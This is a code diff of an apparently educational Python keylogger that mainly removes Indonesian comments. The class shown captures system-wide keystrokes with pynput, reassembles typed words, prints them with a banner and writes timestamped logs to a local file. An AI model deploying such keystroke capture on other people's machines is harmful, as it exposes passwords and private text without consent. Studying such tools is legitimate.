@@ -9,10 +9,10 @@ class SimpleKeylogger:
         self.filename = filename
         self.start_time = datetime.datetime.now()
         self.key_count = 0
-        self.current_word = ""  # Buffer untuk kata yang sedang diketik
+        self.current_word = ""  
         
     def print_banner(self):
-        """Menampilkan banner mirip sqlmap"""
+
         banner = """
     __ __          __                          
    / //_/__  __  __/ /___  ____ _____ ____  _____
@@ -21,7 +21,7 @@ class SimpleKeylogger:
 /_/ |_|\___/\__, /_/\____/\__, /\__, /\___/_/     
            /____/        /____//____/              
 """
-        print("\033[1;34m" + banner + "\033[0m")  # Warna biru bold
+        print("\033[1;34m" + banner + "\033[0m")  
         print("\033[1;37m" + "=" * 70 + "\033[0m")
         print("\033[1;33m[*]\033[0m Educational Keylogger v1.0")
         print("\033[1;33m[*]\033[0m Starting at: \033[1;32m{}\033[0m".format(
@@ -31,30 +31,25 @@ class SimpleKeylogger:
         print()
         
     def write_to_file(self, message):
-        """Menulis log ke file"""
         with open(self.filename, "a", encoding="utf-8") as f:
             f.write(message)
     
     def display_word(self):
-        """Menampilkan kata yang sudah diketik"""
         if self.current_word:
             print("\033[1;36m[WORD]\033[0m {}".format(self.current_word))
-            # Tulis kata ke file juga
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
             self.write_to_file(f"[{current_time}] [WORD] {self.current_word}\n")
     
     def on_press(self, key):
-        """Callback saat key ditekan"""
+        
         try:
             current_time = datetime.datetime.now().strftime("%H:%M:%S")
             char = key.char
             log_entry = f"[{current_time}] {char}\n"
             self.key_count += 1
             
-            # Tambahkan karakter ke buffer kata
             self.current_word += char
             
-            # Tampilkan dengan format sqlmap-style
             formatted_output = "\033[1;32m[{}]\033[0m {}".format(
                 current_time, 
                 char
@@ -87,24 +82,22 @@ class SimpleKeylogger:
             log_entry = f"[{current_time}] {key_name}\n"
             self.key_count += 1
             
-            # Tampilkan kata jika spasi, enter, atau tab ditekan
             if key in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.tab]:
                 self.display_word()
-                self.current_word = ""  # Reset buffer kata
+                self.current_word = "" 
             
-            # Handle backspace
             elif key == keyboard.Key.backspace:
                 if self.current_word:
                     self.current_word = self.current_word[:-1]
             
-            # Tampilkan special key
+            
             formatted_output = "\033[1;32m[{}]\033[0m {}".format(
                 current_time, 
                 key_name
             )
             print(formatted_output)
             
-            # Stop jika ESC ditekan
+            
             if key == keyboard.Key.esc:
                 # Tampilkan kata terakhir jika ada
                 if self.current_word:
@@ -115,13 +108,12 @@ class SimpleKeylogger:
         except:
             return True
         
-        # Tulis ke file
+        
         self.write_to_file(log_entry)
         
         return True
     
     def print_footer(self):
-        """Menampilkan informasi akhir"""
         end_time = datetime.datetime.now()
         duration = end_time - self.start_time
         
@@ -136,19 +128,18 @@ class SimpleKeylogger:
         print("\033[1;37m" + "=" * 70 + "\033[0m")
     
     def start(self):
-        """Memulai keylogger"""
         # Clear screen (opsional)
         os.system('clear' if os.name == 'posix' else 'cls')
         
-        # Tampilkan banner
+        
         self.print_banner()
         
-        # Info tambahan
+        
         print("\033[1;33m[*]\033[0m Press \033[1;31mESC\033[0m to stop the keylogger")
         print("\033[1;33m[*]\033[0m Listening for keystrokes...\n")
         print("\033[1;37m" + "-" * 70 + "\033[0m\n")
+    
         
-        # Mulai listener
         try:
             with keyboard.Listener(on_press=self.on_press) as listener:
                 listener.join()
@@ -158,10 +149,10 @@ class SimpleKeylogger:
 
 
 def main():
-    """Fungsi utama"""
+    
     print("\033[1;33m[*]\033[0m Initializing keylogger...")
     
-    # Buat instance keylogger
+    
     logger = SimpleKeylogger()
     
     try:
